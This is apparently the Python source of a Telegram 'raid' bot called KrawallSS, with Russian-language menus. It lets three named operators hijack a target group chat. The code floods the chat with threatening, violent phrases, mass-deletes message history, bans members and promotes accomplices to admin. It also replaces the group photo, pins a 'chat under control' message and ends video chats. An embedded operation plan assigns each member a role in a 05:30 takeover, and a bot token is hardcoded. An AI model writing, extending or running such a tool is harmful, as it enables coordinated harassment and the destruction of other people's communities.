import asyncio
import random
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    CallbackQuery, 
    BufferedInputFile
)
from aiogram.enums import ChatMemberStatus

TOKEN = "8923249846:AAFF9Xaiv3559I9pVtAMVdFGztEUseK3fkY"

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

AUTHORIZED_USERS = {
    8814416374: "Тони",
    7486246362: "Денис",
    5096402714: "Брендон"
}

target_chat_id = -1004398402616
spam_task = None

HOTLINE_PHRASES = [
    "Вы любите причинять боль другим людям?",
    "Оставьте сообщение после звукового сигнала...",
    "Маска надета. Кровь пролита.",
    "Смерть закаляет характер.",
    "Посмотри на мое лицо.",
    "ВНИМАНИЕ: ИДЕТ ПОЛНАЯ ЗАЧИСТКА KrawallSS",
    "ТЕБЕ НИКУДА НЕ СКРЫТЬСЯ",
    "Заходи в чат и зачищай."
]

class AdminStates(StatesGroup):
    waiting_for_custom_photo = State()
    waiting_for_tag_text = State()
    waiting_for_target_id = State()

async def get_bot_permissions():
    perms = {
        "change_info": False,
        "delete_messages": False,
        "restrict_members": False,
        "pin_messages": False,
        "promote_members": False,
        "can_post": False,
        "manage_video_chats": False,
        "is_anonymous": False
    }
    if not target_chat_id:
        return perms

    try:
        member = await bot.get_chat_member(target_chat_id, bot.id)
        if member.status == ChatMemberStatus.ADMINISTRATOR:
            perms["change_info"] = getattr(member, 'can_change_info', False)
            perms["delete_messages"] = getattr(member, 'can_delete_messages', False)
            perms["restrict_members"] = getattr(member, 'can_restrict_members', False)
            perms["pin_messages"] = getattr(member, 'can_pin_messages', False)
            perms["promote_members"] = getattr(member, 'can_promote_members', False)
            perms["can_post"] = getattr(member, 'can_post_messages', True)
            perms["manage_video_chats"] = getattr(member, 'can_manage_video_chats', False)
            perms["is_anonymous"] = getattr(member, 'is_anonymous', False)
        elif member.status == ChatMemberStatus.MEMBER:
            perms["can_post"] = True
    except Exception:
        pass
    return perms

async def get_main_keyboard():
    perms = await get_bot_permissions()
    icon_raid = "✅" if perms["can_post"] else "❌"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔍 Проверить готовность / Цели", callback_data="check_ready_menu")],
        [InlineKeyboardButton(text=f"{icon_raid} ⚡ РЕЙД ПАНЕЛЬ (KrawallSS)", callback_data="menu_raid")],
        [InlineKeyboardButton(text="📋 Список прав админа", callback_data="check_permissions")],
        [InlineKeyboardButton(text="📖 ИНСТРУКЦИЯ К ОПЕРАЦИИ (05:30)", callback_data="view_tasks")],
        [InlineKeyboardButton(text="🌐 Наш сайт", url="https://axelltseymet.github.io/KrawallSS-/")]
    ])

async def get_raid_keyboard():
    perms = await get_bot_permissions()
    icon_post = "✅" if perms["can_post"] else "❌"
    icon_photo = "✅" if perms["change_info"] else "❌"
    icon_pin = "✅" if perms["pin_messages"] else "❌"
    icon_del = "✅" if perms["delete_messages"] else "❌"
    icon_ban = "✅" if perms["restrict_members"] else "❌"
    icon_promote = "✅" if perms["promote_members"] else "❌"
    icon_anon = "✅" if perms["is_anonymous"] else "❌"

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад в главное меню", callback_data="main_menu")],
        [InlineKeyboardButton(text="🛑 ОСТАНОВИТЬ СПАМ / ДЕЙСТВИЯ", callback_data="stop_spam")],
        [InlineKeyboardButton(text=f"{icon_post} 💥 БЫСТРЫЙ СПАМ", callback_data="start_spam")],
        [InlineKeyboardButton(text=f"{icon_del} 🗑 УДАЛИТЬ ВСЮ ИСТОРИЮ (МАССОВО)", callback_data="clear_all_history")],
        [InlineKeyboardButton(text=f"{icon_ban} 🔨 Забанить участника (Выбор)", callback_data="select_user_ban")],
        [InlineKeyboardButton(text=f"{icon_promote} 🏷 Изменить тег участника", callback_data="select_user_tag")],
        [InlineKeyboardButton(text=f"{icon_promote} 👑 Назначить админа", callback_data="select_user_promote")],
        [InlineKeyboardButton(text=f"{icon_anon} 👤 Анонимность участника / бота", callback_data="toggle_anon")],
        [InlineKeyboardButton(text=f"{icon_photo} 📤 Загрузить фото для группы", callback_data="photo_custom")],
        [InlineKeyboardButton(text=f"{icon_pin} 📌 Закрепить протокол KrawallSS", callback_data="pin_protocol")],
        [InlineKeyboardButton(text="📞 Завершить видеочаты", callback_data="end_video_chat")]
    ])

async def build_users_keyboard(action_prefix: str):
    buttons = [[InlineKeyboardButton(text="◀️ Назад в Рейд Панель", callback_data="menu_raid")]]
    
    if target_chat_id:
        try:
            admins = await bot.get_chat_administrators(target_chat_id)
            for m in admins:
                if not m.user.is_bot:
                    name = m.user.first_name or f"ID: {m.user.id}"
                    buttons.append([InlineKeyboardButton(
                        text=f"👤 {name}", 
                        callback_data=f"{action_prefix}_{m.user.id}"
                    )])
        except Exception:
            for uid, name in AUTHORIZED_USERS.items():
                buttons.append([InlineKeyboardButton(
                    text=f"👤 {name}", 
                    callback_data=f"{action_prefix}_{uid}"
                )])

    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS:
        name = AUTHORIZED_USERS[user_id]
        await message.answer(f"Привет, ты {name}. Система KrawallSS активна.", reply_markup=await get_main_keyboard())
    else:
        await message.answer("Иди нахуй.")

@dp.message(Command("set_target"))
async def cmd_set_target(message: Message):
    global target_chat_id
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    if message.chat.type in ["group", "supergroup"]:
        target_chat_id = message.chat.id
        await message.reply(f"🎯 Чат зафиксирован KrawallSS: {message.chat.title} ({target_chat_id})")

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("Главное меню управления KrawallSS:", reply_markup=await get_main_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "check_permissions")
async def cb_check_permissions(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    perms = await get_bot_permissions()
    text = (
        "<b>Права бота в целевом чате (KrawallSS):</b>\n\n"
        f"• Смена профиля группы: {'✅' if perms['change_info'] else '❌'}\n"
        f"• Удаление сообщений: {'✅' if perms['delete_messages'] else '❌'}\n"
        f"• Блокировка пользователей: {'✅' if perms['restrict_members'] else '❌'}\n"
        f"• Закрепление сообщений: {'✅' if perms['pin_messages'] else '❌'}\n"
        f"• Назначение админов: {'✅' if perms['promote_members'] else '❌'}\n"
        f"• Управление видеочатами: {'✅' if perms['manage_video_chats'] else '❌'}\n"
        f"• Анонимность: {'✅' if perms['is_anonymous'] else '❌'}\n"
        f"• Отправка сообщений: {'✅' if perms['can_post'] else '❌'}"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад в Главное Меню", callback_data="main_menu")]
    ]))
    await callback.answer()

@dp.callback_query(F.data == "view_tasks")
async def cb_view_tasks(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in AUTHORIZED_USERS:
        return

    role_name = AUTHORIZED_USERS[user_id]

    if role_name == "Тони":
        text = (
            "<b>ЛИЧНОЕ ЗАДАНИЕ: Тони (Командир)</b>\n"
            "<b>Время выполнения: 05:30</b>\n\n"
            "1. <b>Подготовка:</b> До 05:30 убедись, что скрипт бота запущен на ПК и в консоли нет ошибок.\n"
            "2. <b>Активация:</b> В 05:30 зайди в ЛС к боту и отправь команду /start. Убедись, что бот ответил «Привет, ты Тони.» и выдал пульт с кнопками управления.\n"
            "3. <b>Контроль цели:</b> Когда бота добавят в целевую группу, проверь приход уведомления о захвате цели в ЛС. Нажми кнопку «Проверить готовность».\n"
            "4. <b>Старт:</b> Нажми кнопку управления рейдом — бот мгновенно отправит системный сигнал в группу и выдаст индивидуальные директивы Денису и Брендону.\n"
            "5. <b>Финал:</b> После выполнения задач нажмите «Завершить операцию» для подачи сигнала на отход."
        )
    elif role_name == "Брендон":
        text = (
            "<b>ЛИЧНОЕ ЗАДАНИЕ: Брендон (Администратор прав)</b>\n"
            "<b>Время выполнения: 05:30</b>\n\n"
            "1. <b>Активация:</b> В 05:30 зайди в ЛС к боту и отправь команду /start. Дождись подтверждения роли («Привет, ты Брендон.»).\n"
            "2. <b>Ожидание:</b> Дождись автоматической директивы от бота в ЛС после старта операции.\n"
            "3. <b>Выполнение:</b> Сразу по сигналу зайди в целевую группу и будь готов оперативно выдать полные права администратора Денису, как только он войдёт в чат.\n"
            "4. <b>Завершение:</b> По сигналу «Операция окончена» от бота покинь зону."
        )
    elif role_name == "Денис":
        text = (
            "<b>ЛИЧНОЕ ЗАДАНИЕ: Денис (Оперативник зачистки)</b>\n"
            "<b>Время выполнения: 05:30</b>\n\n"
            "1. <b>Активация:</b> В 05:30 зайди в ЛС к боту и отправь команду /start. Дождись подтверждения роли («Привет, ты Денис.»).\n"
            "2. <b>Ожидание:</b> Находись наготове и жди от бота директиву в ЛС.\n"
            "3. <b>Выполнение:</b> Как только прилетит сообщение с директивой, незамедлительно заходи в целевую группу, принимай права администратора от Брендона и начинай зачистку.\n"
            "4. <b>Завершение:</b> По сигналу «Операция окончена» от бота покинь зону."
        )
    else:
        text = "У вас нет персональных задач."

    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад в главное меню", callback_data="main_menu")]
    ]))
    await callback.answer()

@dp.callback_query(F.data == "menu_raid")
async def cb_menu_raid(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    await callback.message.edit_text("⚡ Рейдовая Панель KrawallSS:", reply_markup=await get_raid_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "check_ready_menu")
async def cb_check_ready_menu(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    
    text = f"🎯 <b>Текущая цель (группа):</b> <code>{target_chat_id if target_chat_id else 'Не задана'}</code>\nСтатус: Готов к работе."
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Ввести / Изменить ID группы", callback_data="set_custom_target_id")],
        [InlineKeyboardButton(text="◀️ Назад в главное меню", callback_data="main_menu")]
    ])
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "set_custom_target_id")
async def cb_set_custom_target_id(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    await state.set_state(AdminStates.waiting_for_target_id)
    await callback.message.edit_text("💬 Отправьте в чат числовой ID группы (например: <code>-100...</code>):", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="check_ready_menu")]
    ]))
    await callback.answer()

@dp.message(AdminStates.waiting_for_target_id)
async def process_custom_target_id(message: Message, state: FSMContext):
    global target_chat_id
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    
    try:
        new_id = int(message.text.strip())
        target_chat_id = new_id
        await message.answer(f"✅ Целевой чат успешно изменен на ID: <code>{target_chat_id}</code>", parse_mode="HTML", reply_markup=await get_main_keyboard())
    except ValueError:
        await message.answer("❌ Ошибка: ID должен состоять только из цифр. Попробуйте снова.")
    
    await state.clear()

# --- МЕНЮ ВЫБОРА УЧАСТНИКОВ ---
@dp.callback_query(F.data == "select_user_ban")
async def cb_select_user_ban(callback: CallbackQuery):
    kb = await build_users_keyboard("act_ban")
    await callback.message.edit_text("🔨 Выберите участника для БАНА:", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("act_ban_"))
async def cb_act_ban(callback: CallbackQuery):
    user_id_to_ban = int(callback.data.split("_")[2])
    try:
        await bot.ban_chat_member(target_chat_id, user_id_to_ban)
        await callback.message.answer(f"✅ Пользователь ({user_id_to_ban}) забанен силами KrawallSS!")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка бана: {e}")
    await callback.answer()

@dp.callback_query(F.data == "select_user_promote")
async def cb_select_user_promote(callback: CallbackQuery):
    kb = await build_users_keyboard("act_promote")
    await callback.message.edit_text("👑 Выберите участника для НАЗНАЧЕНИЯ АДМИНОМ:", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("act_promote_"))
async def cb_act_promote(callback: CallbackQuery):
    user_id_to_promote = int(callback.data.split("_")[2])
    try:
        await bot.promote_chat_member(
            target_chat_id, 
            user_id_to_promote,
            can_manage_chat=True,
            can_delete_messages=True,
            can_restrict_members=True
        )
        await callback.message.answer(f"👑 Пользователь ({user_id_to_promote}) назначен администратором!")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка выдачи админки: {e}")
    await callback.answer()

@dp.callback_query(F.data == "select_user_tag")
async def cb_select_user_tag(callback: CallbackQuery):
    kb = await build_users_keyboard("act_tag")
    await callback.message.edit_text("🏷 Выберите участника для СМЕНЫ ТЕГА:\n*(Внимание: Telegram не разрешает менять тег владельцу группы и пользователям, не назначенным через бота)*", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("act_tag_"))
async def cb_act_tag(callback: CallbackQuery, state: FSMContext):
    target_uid = int(callback.data.split("_")[2])
    await state.update_data(target_uid=target_uid)
    await state.set_state(AdminStates.waiting_for_tag_text)
    
    await callback.message.edit_text("Введите желаемый ТЕГ (титул) для этого участника:")
    await callback.answer()

@dp.message(AdminStates.waiting_for_tag_text)
async def process_tag_text(message: Message, state: FSMContext):
    data = await state.get_data()
    target_uid = data.get("target_uid")
    custom_title = message.text

    try:
        await bot.set_chat_administrator_custom_title(target_chat_id, target_uid, custom_title)
        await message.answer(f"✅ Кастомный тег '{custom_title}' успешно установлен!")
    except Exception as e:
        await message.answer(f"❌ Ошибка установки тега: {e}\n(Напоминание: владельцу группы тег поставить нельзя, либо пользователь должен быть админом бота).")

    await state.clear()

@dp.callback_query(F.data == "toggle_anon")
async def cb_toggle_anon(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    try:
        member = await bot.get_chat_member(target_chat_id, bot.id)
        current_anon = getattr(member, 'is_anonymous', False) if member.status == ChatMemberStatus.ADMINISTRATOR else False
        await bot.promote_chat_member(
            target_chat_id,
            bot.id,
            is_anonymous=not current_anon
        )
        status_str = "ВКЛЮЧЕНА" if not current_anon else "ВЫКЛЮЧЕНА"
        await callback.message.answer(f"👤 Анонимность бота успешно {status_str}!")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка изменения анонимности: {e}")
    await callback.answer()

# --- РЕЙД ДЕЙСТВИЯ ---
async def run_spam_loop(chat_id: int):
    try:
        for _ in range(40):
            phrase = random.choice(HOTLINE_PHRASES)
            await bot.send_message(chat_id, phrase)
            await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        pass

@dp.callback_query(F.data == "start_spam")
async def cb_start_spam(callback: CallbackQuery):
    global spam_task
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    if not target_chat_id:
        await callback.message.answer("Ошибка: цель не задана.")
        await callback.answer()
        return
    if spam_task and not spam_task.done():
        await callback.message.answer("⚠️ Спам уже активен!")
        await callback.answer()
        return

    await callback.message.answer("💥 Запуск скоростного спама KrawallSS...")
    spam_task = asyncio.create_task(run_spam_loop(target_chat_id))
    await callback.answer()

@dp.callback_query(F.data == "stop_spam")
async def cb_stop_spam(callback: CallbackQuery):
    global spam_task
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    if spam_task and not spam_task.done():
        spam_task.cancel()
        await callback.message.answer("🛑 Спам остановлен!")
    else:
        await callback.message.answer("Нет активных процессов.")
    await callback.answer()

@dp.callback_query(F.data == "clear_all_history")
async def cb_clear_all_history(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    if not target_chat_id:
        await callback.message.answer("Ошибка: цель не задана.")
        await callback.answer()
        return

    await callback.message.answer("🗑 Массовое удаление истории KrawallSS...")
    latest_msg_id = callback.message.message_id
    deleted_count = 0
    for msg_id in range(latest_msg_id, max(0, latest_msg_id - 300), -1):
        try:
            await bot.delete_message(target_chat_id, msg_id)
            deleted_count += 1
            await asyncio.sleep(0.02)
        except Exception:
            pass
            
    back_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад в главное меню", callback_data="main_menu")]
    ])
    await callback.message.answer(f"✅ Очистка завершена! Удалено доступных сообщений: ~{deleted_count}", reply_markup=back_kb)
    await callback.answer()

@dp.callback_query(F.data == "pin_protocol")
async def cb_pin_protocol(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    try:
        msg = await bot.send_message(target_chat_id, "📌 ЧАТ НАХОДИТСЯ ПОД КОНТРОЛЕМ KrawallSS!")
        await bot.pin_chat_message(target_chat_id, msg.message_id)
        await callback.message.answer("Сообщение успешно закреплено!")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка закрепления: {e}")
    await callback.answer()

@dp.callback_query(F.data == "end_video_chat")
async def cb_end_video_chat(callback: CallbackQuery):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    try:
        await bot.stop_chat_voice_chat(target_chat_id)
        await callback.message.answer("📞 Видеочат завершен силами KrawallSS!")
    except Exception as e:
        await callback.message.answer(f"❌ Не удалось завершить видеочат: {e}")
    await callback.answer()

@dp.callback_query(F.data == "photo_custom")
async def cb_photo_custom(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in AUTHORIZED_USERS:
        return
    await state.set_state(AdminStates.waiting_for_custom_photo)
    await callback.message.edit_text("📤 Пришлите картинку (фотографию) сюда, в личные сообщения боту, и KrawallSS мгновенно установит её на аватарку группы!")
    await callback.answer()

@dp.message(AdminStates.waiting_for_custom_photo, F.photo)
async def process_custom_photo(message: Message, state: FSMContext):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    if not target_chat_id:
        await message.answer("❌ Ошибка: целевая группа не зафиксирована.")
        await state.clear()
        return

    try:
        photo_file = message.photo[-1]
        file_bytes = await bot.download(photo_file.file_id)
        input_file = BufferedInputFile(file_bytes.read(), filename="avatar.jpg")
        
        await bot.set_chat_photo(target_chat_id, input_file)
        await message.answer("✅ Новая аватарка успешно установлена на группу силами KrawallSS!")
    except Exception as e:
        await message.answer(f"❌ Не удалось изменить фото (проверьте права бота 'Изменение профиля группы'): {e}")
    
    await state.clear()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
